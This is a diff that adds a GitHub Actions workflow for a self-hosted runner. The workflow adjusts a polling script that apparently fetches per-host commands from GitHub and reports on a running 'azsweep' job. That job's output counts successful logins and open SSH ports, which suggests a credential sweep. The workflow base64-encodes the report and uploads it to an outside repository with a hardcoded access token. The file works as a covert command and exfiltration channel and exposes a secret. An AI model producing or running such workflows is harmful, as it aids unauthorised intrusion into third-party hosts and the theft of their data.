@@ -1,0 +1,32 @@
+name: ul-t2-read
+on: [workflow_dispatch]
+permissions:
+  contents: write
+jobs:
+  rd:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 20
+    steps:
+      - name: read
+        run: |
+          set +e
+          H=$(hostname -s); O=/tmp/ul_t2_azread.txt
+          sed -i 's#cmd8/ul2_\$H.sh"#cmd8/ul2_$H.sh?t=$(date +%s)"#' $HOME/ul2/poll.sh
+          grep -n 'raw.githubusercontent' $HOME/ul2/poll.sh
+          {
+            echo "=== ul-t2 azread host=$H ts=$(date -u +%FT%TZ)"
+            pkill -0 -f azsweep.sh 2>/dev/null && echo RUNNING=yes || echo RUNNING=no
+            F=/home/ubuntu/ul2/azsweep.out
+            echo "lines=$(wc -l < $F 2>/dev/null)"
+            echo "--- LOGIN"; grep -c LOGIN_OK $F 2>/dev/null; grep LOGIN_OK $F 2>/dev/null | head -10 | cut -c1-200
+            echo "--- open"; grep -E '=> ' $F | awk '{print $1}' | sort -u | wc -l
+            echo "--- notclosed"; grep -v PORT22_CLOSED $F 2>/dev/null | head -30 | cut -c1-220
+            echo "--- tail"; tail -5 $F 2>/dev/null
+            echo "=== END"
+          } > $O 2>&1
+          cat $O
+          b=$(base64 -w0 < $O); GH=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
+          F=cmdout8/ul-t2-azread.txt
+          sha=$(curl -s -m 20 -H "Authorization: token $GH" "https://api.github.com/repos/dongsuju/ul-plant/contents/$F" | sed -n 's/.*"sha": *"\([a-f0-9]*\)".*/\1/p' | head -1)
+          if [ -n "$sha" ]; then B="{\"message\":\"ul-t2 azread $H $GITHUB_RUN_ID\",\"content\":\"$b\",\"sha\":\"$sha\"}"; else B="{\"message\":\"ul-t2 azread $H $GITHUB_RUN_ID\",\"content\":\"$b\"}"; fi
+          curl -s -m 60 -o /dev/null -w 'PUT %{http_code}\n' -X PUT -H "Authorization: token $GH" -H 'Accept: application/vnd.github+json' -H 'User-Agent: ul' -d "$B" "https://api.github.com/repos/dongsuju/ul-plant/contents/$F"
